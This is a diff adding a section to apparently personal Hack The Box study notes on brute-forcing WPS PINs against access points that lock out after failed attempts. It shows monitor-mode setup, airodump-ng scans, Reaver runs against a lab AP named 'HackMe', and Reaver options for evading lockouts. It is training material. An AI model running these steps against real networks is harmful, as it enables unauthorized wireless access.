@@ -383,3 +383,116 @@ d41y@htb[/htb]$ sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197
 
 Alternatively, if the AP has a label with the PIN physically printed on the backside of the router, you can use this information to retrieve the WPA-PSK for the Wi-Fi network. This method leverages the default PIN provided by the manufacturer to potentially gain access to the network. For the technique of using the PIN printed on the label to retrieve the WPA-PSK, the AP must be in label mode.
 
+### Secured Access Points
+
+> [!INFO]
+> Traditionally, online brute-forcing attempts have been utilized in retrieving the WPS PIN and WPA-PSK. However, in recent years, manufacturers have become wiser to these attacks. As such, locking has been utilized to prevent these traditional bruteforcing techniques. The most recent vendors only allow up to 3 incorrect attempts. After each incorrect attempt, the AP will lock for 60 seconds. After 10 incorrect attempts, the AP will lock for 365 days.
+
+Enable monitor mode and add a new interface:
+
+```bash
+d41y@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor
+
+d41y@htb[/htb]$ ifconfig mon0 up
+
+d41y@htb[/htb]$ iwconfig
+
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+wlan0     IEEE 802.11  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:on
+```
+
+Then, use `airodump-ng` to continuously scan for the WPS status of nearby networks.
+
+```bash
+d41y@htb[/htb]$ airodump-ng mon0 --wps -c 1
+
+
+ CH  1 ][ Elapsed: 1 min ][ 2024-07-01 19:51 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID
+
+ 86:53:10:C3:1B:26  -28      555        0    0   1   54   WPA2 CCMP   PSK  2.0 LAB,DISP,KPAD  HackMe     
+```
+
+In a new terminal, you can start the bruteforce attempt on the available WiFi network.
+
+```bash
+d41y@htb[/htb]$ reaver -i mon0 -c 1 -b 86:53:10:C3:1B:26 -v
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 86:53:10:C3:1B:26
+[+] Received beacon from 86:53:10:C3:1B:26
+[+] Trying pin "12345670"
+[!] Found packet with bad FCS, skipping...
+[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
+[+] Trying pin "00005678"
+[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
+[+] Trying pin "01235678"
+[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
+
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+```
+
+After three incorrect attempts, the AP will enter a `Locked` state for 60 seconds. Each subsequent wrong PIN attempt will cause the AP to lock for another 60 seconds. However, after 10 incorrect attempts, the AP will lock for 365 days.
+
+You can observe in the `airodump-ng` output that the AP goes into a `Locked` state.
+
+```bash
+d41y@htb[/htb]$ airodump-ng mon0 --wps -c 1
+
+
+ CH  1 ][ Elapsed: 48 s ][ 2024-07-01 19:52 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID
+
+ 86:53:10:C3:1B:26  -28   0      483       33    0   1   54   WPA2 CCMP   PSK Locked              HackMe
+```
+
+In some cases, vendors might have not implemented strict lock mechanisms, allowing you to continue bruteforcing using Reaver. The tool can be fine-tuned with additional advanced switches to optimize the bruteforce process, for example:
+
+|**Option**|**Description**|
+|---|---|
+|`-L, --ignore-locks`|Ignore locked state reported by the target AP|
+|`-N, --no-nacks`|Do not send NACK messages when out of order packets are received|
+|`-d, --delay=<seconds>`|Set the delay between pin attempts 1|
+|`-T, --m57-timeout=<seconds>`|Set the M5/M7 timeout period 0.40|
+|`-r, --recurring-delay=<x:y>`|Sleep for y seconds every x pin attempts|
+
+With the latest models from certain vendors, when the AP reaches the 10th incorrect PIN attempt, it will lock for 365 days, preventing any further bruteforce attempts.
+
+```bash
+d41y@htb[/htb]$ reaver -i mon0 -c 1 -b 86:53:10:C3:1B:26 -v
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+<SNIP>
+[+] Trying pin "77775672"
+[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+```
+
